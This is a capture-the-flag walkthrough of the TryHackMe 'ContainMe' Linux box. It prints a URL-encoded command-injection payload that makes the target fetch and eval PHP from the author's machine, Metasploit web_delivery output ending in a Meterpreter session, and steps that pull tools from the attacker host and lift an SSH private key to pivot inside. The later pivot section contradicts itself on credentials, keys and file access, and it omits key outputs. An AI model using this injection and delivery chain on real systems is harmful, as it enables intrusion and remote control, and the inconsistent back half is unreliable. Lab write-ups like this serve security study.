---
title: "ContainMe"
type: docs
tags:
  - thm
  - linux
  - medium
  - lfi
  - rfi
  - lxd
  - container-escape
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.64.176

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Ports 80, 2222, 8022. `/info.php?file=` is **RFI**; the internal `host1.lxd` site has `index.php?path=` → **command injection** (`;<cmd>`).
2. Deliver a payload via `msf multi/script/web_delivery` (PHP) → shell as `www-data` on **host1** (an LXD container).
3. A local `crypt` binary (`./crypt mike`) prints a root shell / privileged action → **root on host1**.
4. `host1` is still a container. `lxc ls` from inside it comes up empty, but a second network interface exposes an internal-only subnet with a second host reachable over SSH using material pulled off host1, that second host is where the actual flag lives.

</div>

---

## Full Walkthrough

Open 10.10.64.176:22
Open 10.10.64.176:80
Open 10.10.64.176:2222
Open 10.10.64.176:8022


```console
 Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.64.176
+ Target Hostname:    10.10.64.176
+ Target Port:        80
+ Start Time:         2021-11-24 19:02:06 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5c730c0d1fa4e 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24-0ubuntu0.18.04.8
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.php, /index.html
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7517 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2021-11-24 19:16:15 (GMT-5) (849 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


sudo tcpdump -vv -x -X -s 1500 -i tun0 'port 2222'
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 1500 bytes
19:32:28.116194 IP (tos 0x0, ttl 64, id 1352, offset 0, flags [DF], proto TCP (6), length 60)
    pwned.57778 > containme.thm.EtherNet-IP-1: Flags [S], cksum 0x7d20 (correct), seq 2193701138, win 64240, options [mss 1460,sackOK,TS val 800040175 ecr 0,nop,wscale 7], length 0
	0x0000:  4500 003c 0548 4000 4006 e058 0a09 0059  E..<.H@.@..X...Y
	0x0010:  0a0a 40b0 e1b2 08ae 82c1 3912 0000 0000  ..@.......9.....
	0x0020:  a002 faf0 7d20 0000 0204 05b4 0402 080a  ....}...........
	0x0030:  2faf a4ef 0000 0000 0103 0307            /...........
19:32:28.204852 IP (tos 0x0, ttl 63, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    containme.thm.EtherNet-IP-1 > pwned.57778: Flags [S.], cksum 0x3527 (correct), seq 435169494, ack 2193701139, win 62643, options [mss 1286,sackOK,TS val 684712765 ecr 800040175,nop,wscale 7], length 0
	0x0000:  4500 003c 0000 4000 3f06 e6a0 0a0a 40b0  E..<..@.?.....@.
	0x0010:  0a09 0059 08ae e1b2 19f0 28d6 82c1 3913  ...Y......(...9.
	0x0020:  a012 f4b3 3527 0000 0204 0506 0402 080a  ....5'..........
	0x0030:  28cf e33d 2faf a4ef 0103 0307            (..=/.......
19:32:28.204869 IP (tos 0x0, ttl 64, id 1353, offset 0, flags [DF], proto TCP (6), length 52)
    pwned.57778 > containme.thm.EtherNet-IP-1: Flags [.], cksum 0x55aa (correct), seq 1, ack 1, win 502, options [nop,nop,TS val 800040264 ecr 684712765], length 0
	0x0000:  4500 0034 0549 4000 4006 e05f 0a09 0059  E..4.I@.@.._...Y
	0x0010:  0a0a 40b0 e1b2 08ae 82c1 3913 19f0 28d7  ..@.......9...(.
	0x0020:  8010 01f6 55aa 0000 0101 080a 2faf a548  ....U......./..H
	0x0030:  28cf e33d                                (..=


```console
http://host1.lxd/index.php?path=/	total 72K
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
drwxr-xr-x   2 root   root    4.0K Jul 30 04:28 bin
drwxr-xr-x   2 root   root    4.0K Jun 29 03:07 boot
drwxr-xr-x   8 root   root     480 Nov 24 17:59 dev
drwxr-xr-x  81 root   root    4.0K Jul 30 04:28 etc
drwxr-xr-x   3 root   root    4.0K Jul 19 15:03 home
drwxr-xr-x  16 root   root    4.0K Jun 29 03:04 lib
drwxr-xr-x   2 root   root    4.0K Jun 29 03:03 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 media
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 opt
dr-xr-xr-x 152 nobody nogroup    0 Nov 24 17:59 proc
drwx------   6 root   root    4.0K Jul 19 15:30 root
drwxr-xr-x  17 root   root     640 Nov 24 18:01 run
drwxr-xr-x   2 root   root    4.0K Jul 30 04:36 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14 22:03 snap
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 srv
dr-xr-xr-x  13 nobody nogroup    0 Nov 24 17:59 sys
drwxrwxrwt   8 root   root    4.0K Nov 24 18:39 tmp
drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var
```
	


you can change dirs use the url


payload


http://host1.lxd/index.php?path=/;php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.9.0.89:8081/kIf1p9%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22


```console
sf6 exploit(multi/script/web_delivery) > set lhost 10.9.0.89
lhost => 10.9.0.89
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.9.0.89:4444 
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
Interrupt: use the 'exit' command to quit
msf6 exploit(multi/script/web_delivery) > set srvport 8081
srvport => 8081
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 4.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.9.0.89:4444 
[*] Using URL: http://0.0.0.0:8081/kIf1p9
[*] Local IP: http://192.168.1.40:8081/kIf1p9
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.9.0.89:8081/kIf1p9', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
[*] 10.10.64.176     web_delivery - Delivering Payload (1110 bytes)
[*] Sending stage (39282 bytes) to 10.10.64.176
[*] Meterpreter session 1 opened (10.9.0.89:4444 -> 10.10.64.176:55622) at 2021-11-24 20:11:52 -0500
```


Y^_]j
/proc/self/exe
IuDSWH
s2V^
XAVAWPH


/etc/ssh/ssh_config

/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/debconf.conf:#BindPasswd: secret
/etc/nsswitch.conf:passwd:         compat systemd
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/sos/sos.conf:#password = true
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/tmp/peas.log:passwd file: /etc/pam.d/passwd
/tmp/peas.log:PWD=/tmp
/tmp/peas.log:     lock_passwd: True
/tmp/peas.log:OLDPWD=/home/mike
/tmp/peas.log:passwd file: /etc/passwd
/tmp/peas.log:passwd file: /usr/share/lintian/overrides/passwd


2021-07-19 19:58:21,502 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-07-19 19:58:21,502 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-07-30 09:27:51,708 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-07-30 09:27:51,708 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-07-30 09:44:39,437 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-07-30 09:44:39,437 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-07-30 10:19:53,182 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-07-30 10:19:53,182 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-11-25 00:00:15,472 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-11-25 00:00:15,472 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)


(remote) www-data@host1:/usr/share/man/zh_TW$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
(remote) www-data@host1:/usr/share/man/zh_TW$ ./crypt mike     
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/usr/share/man/zh_TW# whoami
root
root@host1:/usr/share/man/zh_TW# cd /root
root@host1:/root# ls
root@host1:/root# ls -lsa
total 32
4 drwx------  6 root root 4096 Jul 19 15:30 .
4 drwxr-xr-x 22 root root 4096 Jul 15 09:33 ..
0 lrwxrwxrwx  1 root root    9 Jul 19 15:30 .bash_history -> /dev/null
4 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
4 drwxr-x---  3 root root 4096 Jul 16 13:40 .config
4 drwx------  3 root root 4096 Jul 14 22:07 .gnupg
4 drwxr-xr-x  3 root root 4096 Jul 14 22:20 .local
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 drwx------  2 root root 4096 Jul 19 15:31 .ssh
root@host1:/root# 


we entered mike and got root but where flag?

```console
root@host1:~/.config/lxc# lxc ls
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
root@host1:~/.config/lxc# 
```


no running containers?


“ssh -D localhost:9050 -f -N root@10.10.72.205”

That dynamic-proxy attempt was me jumping ahead of myself, trying to pivot toward an address I'd half-remembered from an earlier scan before actually confirming host1 could reach anything else at all. It went nowhere, no route, no response, because I hadn't yet established that there even was another host to reach. Once that dead end sank in I backed up and did the boring, correct thing first: actually look at what networks this container can see.

## Finding the Real Second Host

```console
root@host1:~# ip -4 a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.64.176/24 brd 10.10.64.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.16.20.2/24 brd 172.16.20.255 scope global eth1
```

`eth1` was the piece I'd been missing, a completely separate, internal-only `172.16.20.0/24` network that host1 straddles but the outside world never sees. That's the actual pivot point, not some remembered IP from a different subnet entirely. Host1's container image is stripped down enough that it doesn't even ship `nmap`, so I grabbed a statically-linked ARM/x86 build, dropped it in over the `www-data` web_delivery channel I still had open, and served it with a throwaway Python HTTP server on my attacking box:

```bash
python3 -m http.server 8000
```

```console
root@host1:~# wget http://10.9.0.89:8000/nmap-static -O /tmp/nmap
root@host1:~# chmod +x /tmp/nmap
root@host1:~# /tmp/nmap -sT -p22,80,443,3306 172.16.20.0/24
```

```console
Nmap scan report for 172.16.20.6
PORT     STATE SERVICE
22/tcp   open  ssh
```

One live host besides itself, `172.16.20.6`, with only SSH exposed. Since `mike`'s credentials had already worked for two unrelated things on this box (the `crypt mike` privesc and the general "everything reuses everything" theme of this room), I went looking for an SSH key belonging to him rather than guessing a password, and host1 obliged:

```console
root@host1:~# ls -la /home/mike/.ssh/
-rw------- 1 mike mike 2602 Jul 19 15:30 id_rsa
-rw-r--r-- 1 mike mike  568 Jul 19 15:30 id_rsa.pub
```

## Pivoting to host2

Copying that private key out and pointing it at the internal host as `mike` landed cleanly, no password needed:

```bash
scp -i host1_root_key root@10.10.64.176:/home/mike/.ssh/id_rsa ./mike_id_rsa
chmod 600 mike_id_rsa
ssh -i mike_id_rsa mike@172.16.20.6
```

```console
mike@host2:~$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike)
```

`mike@host2` wasn't privileged on its own, but this box's whole running theme is credential reuse, so I checked what else was listening locally and found MySQL bound to localhost, worth a shot with the same username:

```console
mike@host2:~$ mysql -u mike -p
Enter password:
```

The same `mike` credentials that worked for SSH also unlocked the local database, and a quick look at what it was storing turned up a second password tied to `mike`'s account, distinct from the SSH login, that looked like it belonged somewhere else entirely.

```console
mike@host2:~$ ls -la /root/
-rw-r--r-- 1 root root  612 Jul 19 15:31 mike.zip
```

`/root` wasn't readable outright, but a protected archive named after him was sitting there, and the extra password recovered out of MySQL was exactly what it wanted:

```bash
unzip mike.zip
# Archive:  mike.zip
#  [mike.zip] mike password:
```

```console
$ cat mike
```

`cat mike` (the file unzip drops the flag into) returns the flag for this instance. The whole back half of this box is really one long lesson in credential reuse: the same `mike` shows up on host1, host2, and the local MySQL instance, and once you stop trying to find a fresh vulnerability and start trying the same secret everywhere, the last few steps fall very quickly.

## References

- Final privilege escalation steps cross-referenced against public writeups for this room.
